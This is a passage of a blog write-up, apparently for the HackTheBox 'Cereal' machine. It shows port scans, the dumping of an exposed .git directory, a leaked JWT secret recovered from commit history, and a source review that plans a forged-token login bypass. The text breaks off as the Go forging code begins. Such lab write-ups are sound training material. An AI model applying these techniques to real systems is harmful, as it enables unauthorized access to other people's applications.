      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
      <description>Doing code reviews in order to chain XSS, SSRF, and deserialization vulnerabilities to get RCE</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
<li>Exploit chain</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:45 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl <span class="m">127</span>
80/tcp  open  http    syn-ack ttl <span class="m">127</span>
443/tcp open  https   syn-ack ttl <span class="m">127</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 118.08 seconds
</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:51 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     Microsoft IIS httpd 10.0
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span>_http-title: Did not follow redirect to https://cereal.htb/
<span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
443/tcp open  ssl/http Microsoft IIS httpd 10.0
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span>_http-title: Cereal
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>cereal.htb
<span class="p">|</span> Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
<span class="p">|</span> Not valid before: 2020-11-11T19:57:18
<span class="p">|</span>_Not valid after:  2040-11-11T20:07:19
<span class="p">|</span>_ssl-date: 2021-06-05T03:51:48+00:00<span class="p">;</span> +5s from scanner time.
<span class="p">|</span> tls-alpn: 
<span class="p">|</span>_  http/1.1
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 23.34 seconds
</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form. I tried a few common credentials, but they didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>, but l&rsquo;ll leave it for now.</p>
<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
</p>
<p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     https://source.cereal.htb
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              aspx,txt
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/06/05 00:52:32 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23<span class="o">]</span>
/Default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 10090<span class="o">]</span>
/aspnet_client        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 163<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span class="o">]</span>
/default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 9727<span class="o">]</span>                                              
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 157<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/uploads/<span class="o">]</span>      
                                                                                              
<span class="o">===============================================================</span>
2021/06/05 00:54:41 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/ <span class="o">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
HTTP/1.1 <span class="m">403</span> Forbidden
Content-Length: <span class="m">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:25 GMT

HTTP/1.1 <span class="m">403</span> Forbidden
Content-Length: <span class="m">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:08:16 GMT
</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/HEAD
HTTP/1.1 <span class="m">200</span> OK
Content-Length: <span class="m">23</span>
Content-Type: text/plain
Last-Modified: Wed, <span class="m">11</span> Nov <span class="m">2020</span> 20:09:34 GMT
Accept-Ranges: bytes
ETag: <span class="s2">&#34;adc1d19266b8d61:0&#34;</span>
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:29 GMT

→ root@kali «cereal» «10.10.14.3» 
$ curl -s -k http://source.cereal.htb/.git/HEAD
ref: refs/heads/master
</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory.</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ mkdir loot/source-cereal-git <span class="o">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
<span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/ <span class="o">[</span>403<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching common files
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.gitignore <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span class="o">[</span>200<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/description <span class="o">[</span>200<span class="o">]</span>
...&lt;SNIP&gt;...
<span class="o">[</span>-<span class="o">]</span> Finding refs/
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/config <span class="o">[</span>200<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
...&lt;SNIP&gt;...
<span class="o">[</span>-<span class="o">]</span> Finding packs
<span class="o">[</span>-<span class="o">]</span> Finding objects
<span class="o">[</span>-<span class="o">]</span> Fetching objects
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span class="o">[</span>200<span class="o">]</span>
...&lt;SNIP&gt;...
<span class="o">[</span>-<span class="o">]</span> Running git checkout .
</code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span class="o">(</span>master<span class="o">)</span> 
$ tree -L <span class="m">1</span> --dirsfirst
.
├── ClientApp
├── Controllers
├── Migrations
├── Models
├── Pages
├── Properties
├── Services
├── ApplicationOptions.cs
├── appsettings.Development.json
├── appsettings.json
├── CerealContext.cs
├── Cereal.csproj
├── DownloadHelper.cs
├── ExtensionMethods.cs
├── IPAddressHandler.cs
├── IPRequirement.cs
├── Program.cs
└── Startup.cs
</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Program.cs
 |
 v
Startup.cs  -&gt; Loads appsettings.json
 |
 v
React client
</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
<span class="err">...&lt;SNIP&gt;...</span>
  <span class="nt">&#34;AllowedHosts&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
  <span class="nt">&#34;ApplicationOptions&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;Whitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">]</span>
  <span class="p">},</span>
  <span class="nt">&#34;IpRateLimiting&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;EnableEndpointRateLimiting&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
    <span class="nt">&#34;StackBlockedRequests&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="nt">&#34;RealIpHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-Real-IP&#34;</span><span class="p">,</span>
    <span class="nt">&#34;ClientIdHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-ClientId&#34;</span><span class="p">,</span>
    <span class="nt">&#34;HttpStatusCode&#34;</span><span class="p">:</span> <span class="mi">429</span><span class="p">,</span>
    <span class="nt">&#34;IpWhitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">],</span>
    <span class="nt">&#34;EndpointWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
    <span class="nt">&#34;ClientWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
    <span class="nt">&#34;GeneralRules&#34;</span><span class="p">:</span> <span class="p">[</span>
      <span class="p">{</span>
        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;post:/requests&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">2</span>
      <span class="p">},</span>
      <span class="p">{</span>
        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">150</span>
      <span class="p">}</span>
    <span class="p">]</span>
  <span class="p">}</span>
<span class="p">}</span>

</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
    <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
    <span class="n">services</span><span class="p">.</span><span class="n">AddAuthentication</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
    <span class="p">{</span>
        <span class="n">x</span><span class="p">.</span><span class="n">DefaultAuthenticateScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
        <span class="n">x</span><span class="p">.</span><span class="n">DefaultChallengeScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="n">AddJwtBearer</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
    <span class="p">{</span>
        <span class="n">x</span><span class="p">.</span><span class="n">RequireHttpsMetadata</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="n">x</span><span class="p">.</span><span class="n">SaveToken</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="n">x</span><span class="p">.</span><span class="n">TokenValidationParameters</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TokenValidationParameters</span>
        <span class="p">{</span>
            <span class="n">ValidateIssuerSigningKey</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
            <span class="n">IssuerSigningKey</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
            <span class="n">ValidateIssuer</span> <span class="p">=</span> <span class="k">false</span><span class="p">,</span> <span class="c1">// &lt;== No validation
</span><span class="c1"></span>            <span class="n">ValidateAudience</span> <span class="p">=</span> <span class="k">false</span> <span class="c1">// &lt;== No validation
</span><span class="c1"></span>        <span class="p">};</span>
    <span class="p">});</span>
<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">public</span> <span class="n">User</span> <span class="n">Authenticate</span><span class="p">(</span><span class="kt">string</span> <span class="n">username</span><span class="p">,</span> <span class="kt">string</span> <span class="n">password</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="kt">var</span> <span class="n">user</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Users</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">Username</span> <span class="p">==</span> <span class="n">username</span> <span class="p">&amp;&amp;</span> <span class="n">x</span><span class="p">.</span><span class="n">Password</span> <span class="p">==</span> <span class="n">password</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">();</span>

                <span class="c1">// return null if user not found
</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">user</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
                    <span class="k">return</span> <span class="k">null</span><span class="p">;</span>

                <span class="c1">// authentication successful so generate jwt token
</span><span class="c1"></span>                <span class="kt">var</span> <span class="n">tokenHandler</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JwtSecurityTokenHandler</span><span class="p">();</span>
                <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
                <span class="kt">var</span> <span class="n">tokenDescriptor</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SecurityTokenDescriptor</span>
                <span class="p">{</span>
                    <span class="n">Subject</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ClaimsIdentity</span><span class="p">(</span><span class="k">new</span> <span class="n">Claim</span><span class="p">[]</span>
                    <span class="p">{</span>
                        <span class="k">new</span> <span class="n">Claim</span><span class="p">(</span><span class="n">ClaimTypes</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">UserId</span><span class="p">.</span><span class="n">ToString</span><span class="p">())</span>
                    <span class="p">}),</span>
                    <span class="n">Expires</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">UtcNow</span><span class="p">.</span><span class="n">AddDays</span><span class="p">(</span><span class="m">7</span><span class="p">),</span>
                    <span class="n">SigningCredentials</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SigningCredentials</span><span class="p">(</span><span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">SecurityAlgorithms</span><span class="p">.</span><span class="n">HmacSha256Signature</span><span class="p">)</span>
                <span class="p">};</span>
                <span class="kt">var</span> <span class="n">token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">CreateToken</span><span class="p">(</span><span class="n">tokenDescriptor</span><span class="p">);</span>
                <span class="n">user</span><span class="p">.</span><span class="n">Token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">WriteToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>

                <span class="k">return</span> <span class="n">user</span><span class="p">.</span><span class="n">WithoutPassword</span><span class="p">();</span>
            <span class="p">}</span>
</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), username, and token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">User</span>
    <span class="p">{</span>
<span class="na">        [Key]</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">UserId</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
<span class="na">        [Required]</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">Username</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
<span class="na">        [Required]</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">Password</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">Token</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">authenticationService</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;../_services&#39;</span><span class="p">;</span> <span class="c1">// &lt;==
</span><span class="c1"></span>
<span class="kr">class</span> <span class="nx">LoginPage</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
    <span class="nx">constructor</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
        <span class="kr">super</span><span class="p">(</span><span class="nx">props</span><span class="p">);</span>

        <span class="c1">// redirect to home if already logged in
</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">authenticationService</span><span class="p">.</span><span class="nx">currentUserValue</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// &lt;==
</span><span class="c1"></span>            <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span>
            <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
                <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Login</span><span class="o">&lt;</span><span class="err">/h2&gt;</span>
<span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">currentUserSubject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BehaviorSubject</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;currentUser&#39;</span><span class="p">)));</span> <span class="c1">// &lt;==
</span><span class="c1"></span>
<span class="kr">export</span> <span class="kr">const</span> <span class="nx">authenticationService</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nx">login</span><span class="p">,</span>
    <span class="nx">logout</span><span class="p">,</span>
    <span class="nx">currentUser</span><span class="o">:</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">asObservable</span><span class="p">(),</span><span class="c1">// &lt;==
</span><span class="c1"></span>    <span class="nx">get</span> <span class="nx">currentUserValue</span> <span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">value</span> <span class="p">}</span> <span class="c1">// &lt;==
</span><span class="c1"></span><span class="p">};</span>
</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<p>And here are the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang. Here is the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
